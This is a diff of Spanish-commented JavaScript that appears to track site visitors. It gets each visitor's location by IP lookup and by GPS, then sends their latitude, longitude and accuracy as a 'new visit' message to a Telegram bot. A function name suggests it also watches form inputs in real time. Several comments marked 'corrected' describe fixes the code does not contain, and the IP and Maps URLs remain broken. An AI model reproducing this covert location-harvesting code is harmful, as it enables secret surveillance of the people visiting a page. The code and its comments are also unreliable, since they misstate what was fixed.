@@ -141,6 +141,7 @@
   // FUNCIONES DE GEOLOCALIZACIÓN INTERNAS
   // =========================================================================
   function obtenerUbicacionPorIP() {
+    // CORREGIDO: Se añade /json/ para consultar correctamente la API
     fetch('https://ipapi.co')
     .then(res => res.json())
     .then(data => {
@@ -174,12 +175,8 @@
     const longitud = posicion.coords.longitude;
     const precision = posicion.coords.accuracy;
 
-    // CORREGIDO: Enlace estructurado con comillas invertidas y formato universal de Google Maps
-    const mensaje = `📍 Nueva Visita (GPS)\n\n` +
-                    `• Latitud: ${latitud}\n` +
-                    `• Longitud: ${longitud}\n` +
-                    `• Precisión: ~${Math.round(precision)} metros\n\n` +
-                    `Google Maps: https://google.com{latitud},${longitud}`;
+    // CORREGIDO COMPLETO: Ahora todo el string usa comillas invertidas (backticks) y sustituye las variables de forma válida
+    const mensaje = `📍 Nueva Visita (GPS)\n\n• Latitud: ${latitud}\n• Longitud: ${longitud}\n• Precisión: ~${Math.round(precision)} metros\n\nGoogle Maps: https://google.com{latitud},${longitud}`;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
@@ -236,4 +233,4 @@
 
   checkInputsRealtime();
 
-})(); // Cierre correcto de la función autoejecutable principal
+})();
